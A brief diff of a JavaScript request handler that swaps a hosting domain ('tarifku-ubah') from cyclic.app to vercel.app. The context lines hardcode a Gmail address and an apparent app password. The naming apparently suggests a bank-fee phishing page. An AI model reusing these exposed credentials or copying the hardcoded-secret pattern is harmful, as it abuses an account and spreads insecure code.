@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
-     if (url == 'tarifku-ubah.cyclic.app'){
+     if (url == 'tarifku-ubah.vercel.app'){
            
         email = 'namakubca@gmail.com'
         pass = 'ysniapeokiwasgpt'
